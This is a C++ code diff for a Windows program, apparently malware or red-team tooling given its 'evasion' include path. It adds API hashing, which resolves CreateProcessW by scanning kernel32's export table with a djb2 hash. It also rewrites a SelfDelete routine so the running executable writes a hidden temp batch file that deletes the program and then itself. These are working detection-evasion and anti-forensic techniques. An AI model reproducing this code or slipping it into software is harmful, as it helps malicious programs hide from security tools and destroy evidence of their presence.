@@ -2,6 +2,35 @@
 #include <windows.h>
 #include <string>
 #include <vector>
+#include <fstream>
+#include "../evasion/Syscalls.h"
+
+namespace {
+// djb2 hash impl
+DWORD djb2Hash(const char* str) {
+    DWORD hash = 5381;
+    int c;
+    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
+    return hash;
+}
+
+// getProcByHash (scan export table)
+PVOID getProcByHash(HMODULE mod, DWORD targetHash) {
+    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)mod;
+    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)mod + dosHeader->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)mod + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    DWORD* names = (DWORD*)((BYTE*)mod + exportDir->AddressOfNames);
+    WORD* ordinals = (WORD*)((BYTE*)mod + exportDir->AddressOfNameOrdinals);
+    DWORD* funcs = (DWORD*)((BYTE*)mod + exportDir->AddressOfFunctions);
+
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+        if (djb2Hash((char*)mod + names[i]) == targetHash) {
+            return (PVOID)((BYTE*)mod + funcs[ordinals[i]]);
+        }
+    }
+    return NULL;
+}
+}
 
 namespace cleanup {
 
@@ -15,17 +44,38 @@ void SelfDelete() {
     path_buf.resize(copied);
     std::wstring executablePath(path_buf.begin(), path_buf.end());
 
-    std::wstring command = L"cmd.exe /C ping 127.0.0.1 -n 3 > nul & del /Q \"" + executablePath + L"\"";
+    wchar_t tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    std::wstring batPath = std::wstring(tempPath) + L"\\del.bat";
 
-    STARTUPINFOW si;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
+    std::string batContent = "@echo off\r\n"
+                             "ping 127.0.0.1 -n 3 > nul\r\n"
+                             "del /Q \"" + std::string(executablePath.begin(), executablePath.end()) + "\"\r\n"
+                             "del /Q \"" + std::string(batPath.begin(), batPath.end()) + "\"";
 
-    CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    CloseHandle(pi.hProcess);
-    CloseHandle(pi.hThread);
+    HANDLE hFile = CreateFileW(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        DWORD bytesWritten;
+        WriteFile(hFile, batContent.c_str(), (DWORD)batContent.length(), &bytesWritten, NULL);
+        CloseHandle(hFile);
+
+        std::wstring command = L"cmd.exe /C \"" + batPath + L"\"";
+
+        HMODULE hKernel = GetModuleHandleA("kernel32.dll");
+        using CreateProc = BOOL(WINAPI*)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+        DWORD hash = djb2Hash("CreateProcessW");
+        CreateProc pCreate = (CreateProc)getProcByHash(hKernel, hash);
+
+        STARTUPINFOW si;
+        PROCESS_INFORMATION pi;
+        ZeroMemory(&si, sizeof(si));
+        si.cb = sizeof(si);
+        ZeroMemory(&pi, sizeof(pi));
+
+        pCreate(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    }
 }
 
 } // namespace cleanup
